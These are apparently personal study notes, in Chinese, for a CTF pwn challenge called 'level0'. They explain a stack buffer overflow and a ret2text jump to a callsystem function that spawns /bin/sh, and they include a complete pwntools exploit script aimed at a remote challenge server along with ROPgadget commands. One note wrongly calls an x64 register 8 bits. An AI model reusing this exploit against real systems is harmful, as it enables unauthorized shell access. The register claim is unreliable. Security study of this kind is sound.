1、进入main函数，发现main函数中调用vulnerable_function()函数，该函数会返回read(0,&buf,0x200)，点击查看buf，发现该buffer的数据空间大小为0x80，而可以读取的0x200个字节，存在缓冲区溢出漏洞。可以溢出覆盖返回地址，溢出的大小为0x80加上8个字节。最后加上返回的地址的值即可。IDA中查找字符串，发现/bin/sh，查看交叉引用，找到函数callsystem。该函数直接调用system("/bin/sh")，可以直接在溢出后写入该函数的起始地址。
2、linux改名命令mv 源文件名 目标文件名
0、x64程序中，一个寄存器占8位
3、64位程序是寄存器传参，与32位不同，无法直接传入，64位程序先把参数传到寄存器，前6个参数存储在寄存器中，传递顺序rdi,rsi,rdx,rcx,r8,r9.
4、system存在系统最高权限，与/bin/sh连在一起就可以提供一个shell，可以使用它进行查看/修改/操作等动作。
5、IDA中从数据空间大小上可以看出有个s，代表ebp，栈底，占8字节长度，其次是个r，r中存放的是返回地址，代表eip。

writeup第4个不懂



# coding=utf-8
from pwn import *    #导入pwntools中pwn包的所有内容
p = remote('111.198.29.45',33907)    # 链接服务器远程交互
elf = ELF('./level0')    # 以ELF文件格式读取level0文件
sysaddr = elf.symbols['callsystem']    # 获取ELF文件中callsystem的地址
# 先用0x88个无用字符覆盖buf和push的内容，再覆盖返回地址
payload = 'a'*(0x80 + 8) + p64(sysaddr)   
p.recv()    #接收输出
p.send(payload)    # 发送payload
p.interactive()    # 反弹shell进行交互


wp:
1、使用ROPgadget --binary level0 --string '/bin/sh'可以得到字符串地址。
2、使用ROPgadget --binary level0 --only 'pop|ret'可以得到pop|ret的返回值
3、使用objdump -d level0 | grep "plt"可得到plt表的地址
